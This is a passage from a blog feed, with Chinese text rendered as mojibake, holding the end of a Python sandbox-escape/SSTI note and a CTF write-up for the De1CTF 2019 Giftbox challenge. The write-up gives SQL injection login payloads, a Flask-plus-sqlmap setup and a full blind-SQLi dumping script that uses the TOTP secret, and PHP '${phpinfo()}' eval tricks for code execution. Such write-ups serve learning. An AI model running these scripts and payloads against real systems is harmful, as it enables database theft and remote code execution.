&lt;class 'warnings.catch_warnings'&gt;, &lt;class '_weakrefset._IterationGuard'&gt;, &lt;class '_weakrefset.WeakSet'&gt;, &lt;class '_abcoll.Hashable'&gt;, &lt;type 'classmethod'&gt;, &lt;class '_abcoll.Iterable'&gt;, &lt;class '_abcoll.Sized'&gt;, &lt;class '_abcoll.Container'&gt;, &lt;class '_abcoll.Callable'&gt;, &lt;type 'dict_keys'&gt;, &lt;type 'dict_items'&gt;, &lt;type 'dict_values'&gt;, &lt;class 'site._Printer'&gt;, &lt;class 'site._Helper'&gt;, &lt;type '_sre.SRE_Pattern'&gt;, &lt;type '_sre.SRE_Match'&gt;, &lt;type '_sre.SRE_Scanner'&gt;, &lt;class 'site.Quitter'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;type 'operator.itemgetter'&gt;, &lt;type 'operator.attrgetter'&gt;, &lt;type 'operator.methodcaller'&gt;, &lt;type 'functools.partial'&gt;, &lt;type 'MultibyteCodec'&gt;, &lt;type 'MultibyteIncrementalEncoder'&gt;, &lt;type 'MultibyteIncrementalDecoder'&gt;, &lt;type 'MultibyteStreamReader'&gt;, &lt;type 'MultibyteStreamWriter'&gt;]</span><br></pre></td></tr></table></figure></div><p><strong>_<em>subclasses_</em>()</strong> ï¼šæŸ¥çœ‹å½“å‰ç±»çš„å­ç±»ã€‚</p><p>å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥ç”¨ <strong>object._<em>subclasses_</em>()</strong>ï¼Œä¼šå¾—åˆ°å’Œä¸Šé¢ä¸€æ ·çš„ç»“æœã€‚<br>è·å–åŸºç±»è¿˜èƒ½ç”¨è¿˜æœ‰ <strong>_<em>mro_</em></strong>ï¼Œæ¯”å¦‚ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__</span><br><span class="line">(&lt;class 'str'&gt;, &lt;class 'object'&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__mro__</span><br><span class="line">(&lt;class 'list'&gt;, &lt;class 'object'&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#125;.__class__.__mro__</span><br><span class="line">(&lt;class 'dict'&gt;, &lt;class 'object'&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__mro__</span><br><span class="line">(&lt;class 'tuple'&gt;, &lt;class 'object'&gt;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ç´¢å¼•è·å–åŸºç±»</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">object</span>'&gt;</span></span><br></pre></td></tr></table></figure></div><h1 id="åŠ›æ¨å‚è€ƒå­¦ä¹ "><a href="#åŠ›æ¨å‚è€ƒå­¦ä¹ " class="headerlink" title="åŠ›æ¨å‚è€ƒå­¦ä¹ "></a>åŠ›æ¨å‚è€ƒå­¦ä¹ </h1><p><a href="https://blog.csdn.net/qq_43390703/article/details/104256001" target="_blank" rel="noopener">pythonæ²™ç®±é€ƒé€¸</a></p><p><a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">SSTiç¥å™¨â€“Tplmap</a></p><p><a href="https://blog.csdn.net/weixin_43536759/article/details/105066445" target="_blank" rel="noopener">SSTIæ³¨å…¥è¯­å¥æ€»ç»“</a></p><p><a href="https://blog.csdn.net/wy_97/article/details/80393854" target="_blank" rel="noopener">pythonæ²™ç®±é€ƒé€¸ä¸€äº›å¥—è·¯çš„å°ç»“</a></p><p><a href="https://www.freebuf.com/articles/system/203208.html" target="_blank" rel="noopener">ä¸€æ–‡çœ‹æ‡‚Pythonæ²™ç®±é€ƒé€¸</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\yakko117\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\yakko117\assets\js\A
      
    
    </summary>
    
    
      <category term="å­¦ä¹ ç¬”è®°" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="çæ‰¯" scheme="https://manayakko.github.io/yakko117/tags/%E7%9E%8E%E6%89%AF/"/>
    
      <category term="æ¸—é€" scheme="https://manayakko.github.io/yakko117/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>De1CTF Giftboxé¢˜è§£</title>
    <link href="https://manayakko.github.io/yakko117/2020/04/02/De1CTFGiftbox/"/>
    <id>https://manayakko.github.io/yakko117/2020/04/02/De1CTFGiftbox/</id>
    <published>2020-04-02T10:50:48.019Z</published>
    <updated>2020-04-05T04:21:03.814Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>ä¸€é“å¯ä»¥å­¦ä¹ åˆ°å¾ˆå¤šçš„é¢˜ç›®ï¼Œè¿˜æ˜¯è‡ªå·±å¤ªèœäº†ï¼Œè¦çœ‹å¤§ä½¬çš„wpæ‰èƒ½å®Œå…¨äº†è§£é€å½»</p><h1 id="De1CTF-2019-Giftbox"><a href="#De1CTF-2019-Giftbox" class="headerlink" title="[De1CTF 2019]Giftbox"></a>[De1CTF 2019]Giftbox</h1><p>é¢˜ç›®æ‰“å¼€ï¼Œåªèƒ½æ„Ÿæ…¨å¤§å¸ˆå‚…è¿˜æ˜¯å¤§å¸ˆå‚…ï¼Œé¢˜ç›®å‰ç«¯åšæˆè¿™ä¸ªæ•ˆæœï¼Œå¤ªé¡¶äº†</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_1.png" data-fancybox="group" data-caption="gift1" class="fancybox"><img alt="gift1" title="gift1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_1.png" class="lazyload"></a></p><p>çœ‹æ ·å­æ˜¯ä¸ª <code>linuxç»ˆç«¯</code>, ç„¶åçœ‹ä¸€ä¸‹æœ‰å“ªäº›å‘½ä»¤å¯ä»¥è°ƒç”¨</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_2.png" data-fancybox="group" data-caption="gift2" class="fancybox"><img alt="gift2" title="gift2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_2.png" class="lazyload"></a></p><p>è¯•ä¸€ä¸‹ç›¸åº”çš„å‘½ä»¤ï¼Œçœ‹ä¸€ä¸‹æ•ˆæœ</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_3.png" data-fancybox="group" data-caption="gift3" class="fancybox"><img alt="gift3" title="gift3" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_3.png" class="lazyload"></a></p><p>çœ‹åˆ°äº† <code>usage.md</code> æœ‰æ–°çš„ <code>hint</code>ï¼Œå°è¯•ä¸€ä¸‹</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_4.png" data-fancybox="group" data-caption="gift4" class="fancybox"><img alt="gift4" title="gift4" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_4.png" class="lazyload"></a></p><p>å¯ä»¥çœ‹åˆ°ï¼Œéƒ½éœ€è¦å…ˆç™»é™†ï¼Œé‚£å°±å°è¯•ä¸€ä¸‹ <code>sqlæ³¨å…¥</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[de1ta@de1ta-mbp /sandbox]% login admin'and<span class="comment">/**/</span>'1'='1 admin</span><br><span class="line">login fail, password incorrect.</span><br><span class="line">[de1ta@de1ta-mbp /sandbox]% login admin'and<span class="comment">/**/</span>'1'='0 admin</span><br><span class="line">login fail, user not found.</span><br></pre></td></tr></table></figure></div><p>æŸ¥çœ‹æ•°æ®åŒ…ï¼Œçœ‹åˆ°æœ‰ä¸ª <strong><code>totp</code></strong>ï¼Œå†æ¬¡æäº¤ä¹‹åè¿™ä¸ª <strong><code>totp</code></strong> åˆä¼šå‘ç”Ÿæ”¹å˜</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_5.png" data-fancybox="group" data-caption="gift5" class="fancybox"><img alt="gift5" title="gift5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_5.png" class="lazyload"></a></p><hr><h2 id="æŸ¥äº†ä¸€ä¸‹-TOTP"><a href="#æŸ¥äº†ä¸€ä¸‹-TOTP" class="headerlink" title="æŸ¥äº†ä¸€ä¸‹ TOTP"></a>æŸ¥äº†ä¸€ä¸‹ TOTP</h2><p><a href="https://baike.baidu.com/item/TOTP%E7%AE%97%E6%B3%95/22810708?fr=aladdin" target="_blank" rel="noopener">TOTPç®—æ³•</a> (<code>Time-based One-time Password algorithm</code>)æ˜¯ä¸€ç§ä»å…±äº«å¯†é’¥å’Œå½“å‰æ—¶é—´è®¡ç®—ä¸€æ¬¡æ€§å¯†ç çš„ç®—æ³•ã€‚</p><p><strong><font color="6495ED">ä¸€äº›è¦æ±‚</font></strong>ï¼š</p><ul><li>ä»¤ç‰Œä¸æœåŠ¡å™¨ä¹‹é—´å¿…é¡»æ—¶é’ŸåŒæ­¥ï¼›</li><li>ä»¤ç‰Œä¸æœåŠ¡å™¨ä¹‹é—´å¿…é¡»å…±äº«å¯†é’¥ï¼›</li><li>ä»¤ç‰Œä¸æœåŠ¡å™¨ä¹‹é—´å¿…é¡»ä½¿ç”¨ç›¸åŒçš„æ—¶é—´æ­¥é•¿</li></ul><p><strong><font color="6495ED">æ ¸å¿ƒç®—æ³•</font></strong>ï¼š<br><strong><font color="6495ED">TOTP =Truncate(HMAC-SHA-1(K, (T - T0) / X))</font></strong><br><strong><font color="6495ED">X</font></strong> æ˜¯æ—¶é—´é—´éš”</p><hr><p>ç„¶ååœ¨ <code>main.js</code> æ‰¾åˆ°äº†å¯†é’¥</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_6.png" data-fancybox="group" data-caption="gift5" class="fancybox"><img alt="gift5" title="gift5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_6.png" class="lazyload"></a></p><p>åœ¨è¿™ä¸Šé¢çš„æ³¨é‡Šé‡Œä¹Ÿç»™å‡ºäº†æç¤º</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Javascript</div></div><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Developer Notes]</span><br><span class="line">OTP Library <span class="keyword">for</span> Python located <span class="keyword">in</span> js/pyotp.zip</span><br><span class="line">Server Params:</span><br><span class="line">digits = <span class="number">8</span></span><br><span class="line">interval = <span class="number">5</span></span><br><span class="line"><span class="built_in">window</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure></div><p>ç„¶åè·Ÿè¿›å»çœ‹ <code>totp.min.js</code> å¯ä»¥çœ‹åˆ°æœ€åæœ‰æ–°çš„ <code>hint</code> (è™½ç„¶ä½œç”¨ä¸å¤§233</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Javascript</div></div><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Two-factor authentication implementation <span class="keyword">in</span> pure javascript.</span><br><span class="line">One-time password generator (HOTP/TOTP) <span class="keyword">with</span> support <span class="keyword">for</span> Google Authenticator.</span><br><span class="line">@author   wuyanxin &lt;https:<span class="comment">//wuyanxin.com&gt;</span></span><br><span class="line">@license  MIT</span><br></pre></td></tr></table></figure></div><p>ç„¶ååœ¨gayå§æ‰¾åˆ°äº† <a href="https://github.com/wuyanxin/totp.js" target="_blank" rel="noopener">https://github.com/wuyanxin/totp.js</a><br>(ç®—æ³•è¿˜æ˜¯æŒºå¥½ç†è§£çš„)</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_7.png" data-fancybox="group" data-caption="gift5" class="fancybox"><img alt="gift5" title="gift5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_7.png" class="lazyload"></a></p><p>å¯ä»¥çœ‹åˆ°ç¼ºçœå€¼å°±æ˜¯5</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_8.png" data-fancybox="group" data-caption="gift5" class="fancybox"><img alt="gift5" title="gift5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_8.png" class="lazyload"></a></p><p>ç„¶åçœ‹äº†å¤§ä½¬çš„å†™æ³•</p><hr><h2 id="è·å–-sql-å¯†ç "><a href="#è·å–-sql-å¯†ç " class="headerlink" title="è·å– sql å¯†ç "></a>è·å– sql å¯†ç </h2><h3 id="è§£æ³•ä¸€"><a href="#è§£æ³•ä¸€" class="headerlink" title="è§£æ³•ä¸€"></a>è§£æ³•ä¸€</h3><p>ç”¨ <code>flask</code> æ­å»ºä¸€ä¸ªæœ¬åœ°æœåŠ¡å¹¶æ¥å—å‚æ•°ä¼ åˆ°é¶æœºï¼Œç„¶åç”¨ <code>sqlmap</code> å»è·‘æœ¬åœ°é¶æœº</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app=Flask(__name__)</span><br><span class="line">totp=pyotp.TOTP(<span class="string">'GAXG24JTMZXGKZBU'</span>,digits=<span class="number">8</span>,interval=<span class="number">5</span>)</span><br><span class="line">s=requests.session()</span><br><span class="line">fuzz=string.printable</span><br><span class="line"><span class="meta">@app.route('/username=&lt;username&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack</span><span class="params">(username)</span>:</span></span><br><span class="line">    url=<span class="string">'http://link-site/shell.php'</span></span><br><span class="line">    username=(username).replace(<span class="string">' '</span>,<span class="string">'/**/'</span>)</span><br><span class="line">    params=&#123;</span><br><span class="line">        <span class="string">'a'</span>:<span class="string">'login &#123;&#125; admin'</span>.format(username),</span><br><span class="line">        <span class="string">'totp'</span>:totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    res = s.get(url,params=params)</span><br><span class="line">    <span class="keyword">return</span> res.content</span><br><span class="line">app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></div><p>å¯åŠ¨ä¹‹å ç”¨ <code>sqlmap</code> å»è·‘</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://127.0.0.1:5000/username=admin*"</span> -D giftbox -T users -C password --dump  --technique B</span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆ–è€…</span></span><br><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:5000/username=admin*"</span></span><br></pre></td></tr></table></figure></div><p>å¾—åˆ°å¯†ç : <strong><font color="6495ED">hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}</font></strong></p><h3 id="è§£æ³•äºŒ"><a href="#è§£æ³•äºŒ" class="headerlink" title="è§£æ³•äºŒ"></a>è§£æ³•äºŒ</h3><p>æ¥è‡ª<a href="https://www.zhaoj.in/read-6170.html" target="_blank" rel="noopener">èµµå¸ˆå‚…</a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># --- coding: utf-8 ---</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pyotp <span class="keyword">as</span> pyotp</span><br><span class="line"></span><br><span class="line">totp = pyotp.TOTP(<span class="string">'GAXG24JTMZXGKZBU'</span>, <span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    get_all_databases()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">http_get</span><span class="params">(payload)</span>:</span></span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    r = requests.post(<span class="string">'http://link-site/shell.php'</span>, params=&#123;<span class="string">'a'</span>: <span class="string">'login admin\'/**/and/**/('</span> + payload + <span class="string">')/**/and/**/\'1\'=\'1 admin'</span>, <span class="string">'totp'</span>: totp.now()&#125;,data=&#123;<span class="string">'dir'</span>: <span class="string">'/'</span>, <span class="string">'pos'</span>: <span class="string">'/'</span>, <span class="string">'filename'</span>: <span class="string">'usage.md'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'login admin\'/**/and/**/('</span> + payload + <span class="string">')/**/and/**/\'1\'=\'1 admin'</span>)</span><br><span class="line">    print(r.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'password'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–æ•°æ®åº“</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_databases</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># db_nums_payload = "select/**/count(*)/**/from/**/users"</span></span><br><span class="line">    <span class="comment"># db_numbers = half(db_nums_payload)</span></span><br><span class="line">    <span class="comment"># print("é•¿åº¦ä¸ºï¼š%d" % db_numbers)</span></span><br><span class="line"></span><br><span class="line">    db_payload = <span class="string">"select/**/concat(password)/**/from/**/users"</span></span><br><span class="line">    db_name = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">64</span>):</span><br><span class="line">        db_name_payload = <span class="string">"ascii(substr(("</span> + db_payload + <span class="string">"),%d,1))"</span> % (y)</span><br><span class="line">        db_name += chr(half(db_name_payload))</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"å€¼ï¼š"</span> + db_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># äºŒåˆ†æ³•å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">half</span><span class="params">(payload)</span>:</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">126</span></span><br><span class="line">    <span class="comment"># print(standard_html)</span></span><br><span class="line">    <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">        mid = (low + high) / <span class="number">2</span></span><br><span class="line">        mid_num_payload = <span class="string">"%s/**/&gt;/**/%d"</span> % (payload, mid)</span><br><span class="line">        <span class="comment"># print(mid_num_payload)</span></span><br><span class="line">        <span class="comment"># print(mid_html)</span></span><br><span class="line">        <span class="keyword">if</span> http_get(mid_num_payload):</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">    mid_num = int((low + high + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> mid_num</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div><p>åŒæ ·ä¼šå¾—åˆ°å¯†ç : <strong><font color="6495ED">hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}</font></strong></p><hr><h2 id="ç™»é™†"><a href="#ç™»é™†" class="headerlink" title="ç™»é™†"></a>ç™»é™†</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[de1ta@de1ta-mbp /sandbox]% login admin hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;</span><br><span class="line">login success.</span><br></pre></td></tr></table></figure></div><p>ç„¶åè¯•ä¸€ä¸‹ <code>targeting</code> <code>launch</code> <code>destruct</code> ç­‰ç­‰å‘½ä»¤</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_9.png" data-fancybox="group" data-caption="gift5" class="fancybox"><img alt="gift5" title="gift5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_9.png" class="lazyload"></a></p><p>ä»¥åŠ <code>hint</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[de1ta@de1ta-mbp /sandbox]% sh0w_hiiintttt_23333</span><br><span class="line">we add an evil monster named <span class="string">'eval'</span> when launching missiles.</span><br></pre></td></tr></table></figure></div><p>çœ‹åˆ° <code>eval</code> çŸ¥é“è€ƒç‚¹æ˜¯RCEä»£ç æ³¨å…¥<br>ç„¶åç½‘ä¸Šæ‰¾åˆ°äº†è¿™ä¸ª<a href="https://xz.aliyun.com/t/4785" target="_blank" rel="noopener">ä»ä¸€é“é¢˜è®²PHPå¤æ‚å˜é‡</a></p><ul><li>phpä¼šå¤„ç†åŒå¼•å·é‡Œé¢çš„ä¸œè¥¿ï¼Œæ‰€ä»¥ï¼š</li></ul><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"abc"</span>;</span><br><span class="line">$b=<span class="string">"$a"</span>;  è¾“å‡ºabc</span><br><span class="line">$b=<span class="string">"\$a"</span>; è¾“å‡º$a</span><br><span class="line">$b=<span class="string">'$a'</span>;  è¾“å‡º$a</span><br></pre></td></tr></table></figure></div><ul><li>å¦‚æœ <code>{</code> å’Œ <code>$</code> ç´§æŒ¨ç€ä¹Ÿä¼šè¡¨ç¤ºä¸€ä¸ªå˜é‡</li></ul><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$great = <span class="string">'fantastic'</span>;</span><br><span class="line"></span><br><span class="line">æ— æ•ˆï¼Œè¾“å‡º: This is &#123; fantastic&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"This is &#123; $great&#125;"</span>;</span><br><span class="line"></span><br><span class="line">æœ‰æ•ˆï¼Œè¾“å‡ºï¼š This is fantastic</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"This is &#123;$great&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"This is $&#123;great&#125;"</span>;</span><br></pre></td></tr></table></figure></div><ul><li>bypass<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"$&#123;phpinfo()&#125;"</span>;</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">$a=$&#123;phpinfo()&#125;;</span><br></pre></td></tr></table></figure></div></li></ul><p>ç…§ç€ä¸Šé¢çš„æ€è·¯ </p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_9_2.png" data-fancybox="group" data-caption="gift9_2" class="fancybox"><img alt="gift9_2" title="gift9_2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_9_2.png" class="lazyload"></a></p><p>å°† <code>Error</code> çš„ å†…å®¹ä¿å­˜æœ¬åœ° å¯ä»¥çœ‹åˆ°å°±æ˜¯ <code>phpinfo</code></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_10.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_10.png" class="lazyload"></a></p><p>å¯ä»¥çœ‹åˆ° <code>open_basedir</code> é™åˆ¶äº†è·¯å¾„<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_11.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_11.png" class="lazyload"></a></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_11_1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_11_1.png" class="lazyload"></a></p><p>ç„¶åçœ‹ä¸€ä¸‹å…¶ä»–è¿‡æ»¤</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_12.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_12.png" class="lazyload"></a></p><p><strong><font color="6495ED">code</font></strong> é•¿åº¦é™åˆ¶2ä½</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_12_2.png" data-fancybox="group" data-caption class="fancybox"><img alt title 